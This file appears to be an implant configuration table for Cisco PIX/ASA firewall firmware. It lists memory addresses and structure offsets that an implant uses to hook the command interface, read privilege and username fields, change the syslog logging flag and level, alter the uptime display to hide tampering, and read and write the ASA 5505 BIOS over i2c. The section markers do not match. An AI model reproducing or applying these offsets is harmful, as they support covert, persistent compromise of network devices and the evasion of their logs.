; --- SECTION I ---
;
0x4008250d            // pix version
0x2199000             // address of implant configuration
CIStartFunc               0x080cbfe0      // addr of the command interface start function -- telnet function
CommandListAddr           0x09a377a0      // addr of the command list -- first parameter of ci
DeviceListPtrAddr         0x09dfd9b4      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset       0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr            0x09353eb0      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr         0x0a185740      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue               0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue              0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue               0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset               0x84            // Offset into a thread struct containing the stdch pointer
StdErrOffset              0x88            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset            0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset               0x14            // offset into an environment struct containing the username 
EnvPtrOffset              0x90            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset              0x00000bc4      // offset into the syslog structure where the logging level is stored
Open                      0x08066cc0      // open
ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
InputModeOffset           0x14            // offset into a duart config structure where the input mode is stored
InputModeEsc              0x20            // Input mode used for entering escape sequence
WatchDogTimeout           0x098deb04      // Address where the thread timeout value is stored 
UpTimeCounter             0x09fd6148      // Address of the up time counter
Display_uptime_addr       0x080d5830      // Address of the function that display the uptime
Inserted_code_addr        0x09372c20      // Address of the our insterted function to add time to the uptime
i2cReadByte               0x09339e30      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte              0x09339fe0      // write byte function needed to operate on the bios of the asa 5505
CLIHookAddress            0x080cc4e5      // Address of hook into the command interface
AvailMemoryPtr            0x0a12067c      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
